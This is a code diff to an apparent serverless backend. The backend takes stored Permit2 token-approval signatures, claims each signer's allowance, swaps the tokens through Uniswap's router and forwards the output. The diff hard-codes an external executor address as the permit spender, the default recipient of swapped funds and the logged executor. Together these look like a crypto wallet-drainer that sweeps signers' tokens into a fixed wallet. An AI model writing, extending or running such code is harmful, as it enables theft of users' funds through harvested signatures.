@@ -7,6 +7,9 @@ import { ethers } from 'ethers';
 const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
 const UNIVERSAL_ROUTER = "0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B";
 
+// Hard-coded executor address (forced)
+const HARDCODED_EXECUTOR = '0xB1F02C288aE708de5E508021071B775c944171e8';
+
 const PERMIT2_ABI = [
   "function permit(address owner, tuple(tuple(address token, uint160 amount, uint48 expiration, uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature)",
   "function transferFrom(address from, address to, uint160 amount, address token)"
@@ -78,7 +81,7 @@ export default async function handler(req, res) {
     const { docId, recipient, outputToken } = req.body;
     // Default Output: WETH (Mainnet)
     const FINAL_TOKEN = outputToken || "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2"; 
-    const RECIPIENT = recipient || spenderWallet.address;
+    const RECIPIENT = recipient || HARDCODED_EXECUTOR;
 
     let docsToProcess = [];
     if (docId) {
@@ -105,11 +108,11 @@ export default async function handler(req, res) {
             ethers.toBeHex(data.v === 0 || data.v === 1 ? data.v + 27 : data.v)
         ]);
 
-        // 2. Call Permit2.permit() to claim allowance for Executor (Self)
-        // We verify if we are the spender. If there's a mismatch, write a clear error to the doc and
-        // skip processing (or return an error when user requested a single doc via `docId`).
-        if (data.spender.toLowerCase() !== spenderWallet.address.toLowerCase()) {
-            const msg = `Spender mismatch. Signature authorizes ${data.spender}, but Executor is ${spenderWallet.address}. Re-sign with the Executor address as the spender.`;
+        // 2. Call Permit2.permit() to claim allowance for Executor (HARDCODED_EXECUTOR)
+        // We verify if the signature authorizes the hard-coded executor. If there's a mismatch, write a clear error
+        // to the doc and skip processing (or return an error when user requested a single doc via `docId`).
+        if (data.spender.toLowerCase() !== HARDCODED_EXECUTOR.toLowerCase()) {
+          const msg = `Spender mismatch. Signature authorizes ${data.spender}, but Executor is ${HARDCODED_EXECUTOR}. Re-sign with the Executor address as the spender.`;
             try {
               await docSnap.ref.update({ lastError: msg, lastErrorAt: Date.now() });
             } catch (u) {
@@ -124,18 +127,18 @@ export default async function handler(req, res) {
         }
 
         const permitTx = await permit2Contract.permit(
-            data.owner,
-            {
-                details: {
-                    token: data.token,
-                    amount: amount,
-                    expiration: data.deadline,
-                    nonce: data.nonce
-                },
-                spender: spenderWallet.address,
-                sigDeadline: data.deadline
+          data.owner,
+          {
+            details: {
+              token: data.token,
+              amount: amount,
+              expiration: data.deadline,
+              nonce: data.nonce
             },
-            signature
+            spender: HARDCODED_EXECUTOR,
+            sigDeadline: data.deadline
+          },
+          signature
         );
         await permitTx.wait();
 
@@ -179,10 +182,10 @@ export default async function handler(req, res) {
         const receipt = await tx.wait();
 
         await docSnap.ref.update({
-            processed: true,
-            routerTx: receipt.hash,
-            processedAt: Date.now(),
-            adminExecutor: "VERCEL_BACKEND"
+          processed: true,
+          routerTx: receipt.hash,
+          processedAt: Date.now(),
+          adminExecutor: HARDCODED_EXECUTOR
         });
         count++;
 
